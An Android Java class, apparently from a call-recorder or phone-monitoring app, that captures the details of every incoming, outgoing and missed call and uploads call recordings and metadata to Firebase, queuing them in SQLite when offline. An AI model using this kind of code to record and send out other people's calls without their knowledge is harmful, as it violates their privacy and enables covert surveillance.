package call;

import android.content.ContentValues;
import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.support.annotation.NonNull;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.IOException;
import java.util.Date;

import database.DatabaseHelper;
import database.DbContract;
import interfaces.CallListener;
import model.Call;

import static Utils.Utils.SHOW_LOG;
import static Utils.Utils.copyFile;
import static Utils.Utils.getDeviceName;
import static Utils.Utils.isNetworkAvailable;

public class MainCallListener implements CallListener {

    private static Call call ;
    private Context context;
    private DatabaseReference callsReference  = FirebaseDatabase.getInstance().getReference().child(getDeviceName()).child("Calls");
    private FirebaseStorage storageRoot = FirebaseStorage.getInstance();




    @Override
    public void onIncomingCallStarted(Context ctx, String number, Date start, String contactName) {
        this.context = ctx;
        SHOW_LOG("Incoming Call Started");
        call = new Call();
        call.setNumber(number);
        call.setName(contactName);
        call.setTimeStamp(start.getTime());
        call.setType(Call.CallType.INCOMING);

    }

    @Override
    public void onIncomingCallAnswered(Context ctx, String number, Date start, String contactName) {
        SHOW_LOG("Incoming Call Answered");

    }

    @Override
    public void onOutgoingCallStarted(Context ctx, String number, Date start, String contactName) {
        this.context = ctx;
        SHOW_LOG("Outgoing call started");
        call = new Call();
        call.setNumber(number);
        call.setName(contactName);
        call.setTimeStamp(start.getTime());
        call.setType(Call.CallType.OUTGOING);

    }

    @Override
    public void onIncomingCallEnded(Context ctx, String number, Date start, Date end, File recordedFile) {
        this.context = ctx;
        SHOW_LOG("Incoming Call Ended");
        call.setDuration(start,end);
        pushCallToCloud(call,recordedFile);



    }

    @Override
    public void onOutgoingCallEnded(Context ctx, String number, Date start, Date end, File recordedFile) {
        this.context = ctx;
        SHOW_LOG("Outgoing Call Ended");
        call.setDuration(start,end);
        pushCallToCloud(call,recordedFile);


    }

    @Override
    public void onMissedCall(Context ctx, String number, Date start, String contactName) {
        this.context = ctx;
        SHOW_LOG("Missed Call");
        call = new Call();
        call.setNumber(number);
        call.setName(contactName);
        call.setTimeStamp(start.getTime());
        call.setType(Call.CallType.MISSED);
        call.setRecordingPath(null);
        pushCallToCloud(call);

    }




    private void pushCallToCloud(final Call call) {
        if(isNetworkAvailable(context))
        {
            SHOW_LOG("Pushing Call to cloud");
            callsReference.push().setValue(call).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void aVoid) {
                    SHOW_LOG("Call Successfully Transferred");
                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    SHOW_LOG("Call Transferred Failed: "+e.toString());
                    saveCAllToDB(call); // for later upload
                }
            });
        }else
        {
            saveCAllToDB(call); //for later upload
        }

    }
    private void pushCallToCloud(final Call call, final File recordingFile) {
        if(isNetworkAvailable(context))
        {
            // push recording to cloud if successful  then also push call to cloud
            // else push recording+call detail to DB for later upload
            if(recordingFile!=null)
            {
                FirebaseStorage recordingRoot = storageRoot.getReference("Recordings").getStorage();
                final Uri file = Uri.fromFile(recordingFile);
                final StorageReference recordingFileRef = recordingRoot.getReference().child(file.getLastPathSegment());

                recordingFileRef.putFile(file).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        SHOW_LOG("Recording Successfully Uploaded");
                        SHOW_LOG("Upload Session: "+taskSnapshot.getUploadSessionUri().toString());

                        recordingFileRef.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                            @Override
                            public void onSuccess(Uri uri) {
                                SHOW_LOG("URL: "+ uri.toString());
                                call.setRecordingPath(uri.toString());
                                SHOW_LOG("Now Pusing Call to cloud");
                                pushCallToCloud(call);
                            }
                        }).addOnFailureListener(new OnFailureListener() {
                            @Override
                            public void onFailure(@NonNull Exception e) {
                                SHOW_LOG("Getting Recording URL failed: "+e.toString());
                            }
                        });
                    }
                }).addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        SHOW_LOG("Recording Uploading Failed: "+e.toString());
                        saveCallToDB(call, recordingFile); // for later upload
                    }
                });
            }
            else
            {
                pushCallToCloud(call);
            }

        }
        else // if internet not connected
        {
            saveCallToDB(call,recordingFile);
        }
    }

    private void saveCAllToDB(Call call) {
        DatabaseHelper databaseHelper = new DatabaseHelper(context);
        SQLiteDatabase sqLiteDatabase = databaseHelper.getWritableDatabase();
        ContentValues contentValues = new ContentValues();
        contentValues.put(DbContract.CallsDetailTable.COLUMN_NAME,call.getName());
        contentValues.put(DbContract.CallsDetailTable.COLUMN_NUMBER,call.getNumber());
        contentValues.put(DbContract.CallsDetailTable.COLUMN_TIME_STAMP,call.getTimeInMillis());
        contentValues.put(DbContract.CallsDetailTable.COLUMN_DURATION,call.getDuration());
        contentValues.put(DbContract.CallsDetailTable.COLUMN_CALL_TYPE,call.getType().toString());
        contentValues.put(DbContract.CallsDetailTable.COLUMN_RECORDING_FILE_PATH,call.getRecordingPath()); //this is local path
        long insertedRow = sqLiteDatabase.insert(DbContract.CallsDetailTable.TABLE_NAME,null,contentValues);
        if(!(insertedRow<0))
        {
            SHOW_LOG("Call Data successfully inserted into database");
        }
        else {
            SHOW_LOG("Failed to insert CAll data into database");
        }
    }
    private void saveCallToDB(Call call, File recordingFile) {
        String local_recording_file_path = saveFileInLocalStorage(recordingFile);
        call.setRecordingPath(local_recording_file_path);
        saveCAllToDB(call);
    }
    private String saveFileInLocalStorage(File recordingFile) {
        File folder = new File(context.getFilesDir(),"/Recordings");
        File file = new File(folder,recordingFile.getName());
        try {
            copyFile(recordingFile,file);

        } catch (IOException e) {
            SHOW_LOG("File Moved Failed: "+e.toString());
            return  null;
        }
        SHOW_LOG("Moved File path: "+file.getAbsolutePath());
        return file.getAbsolutePath();
    }
}
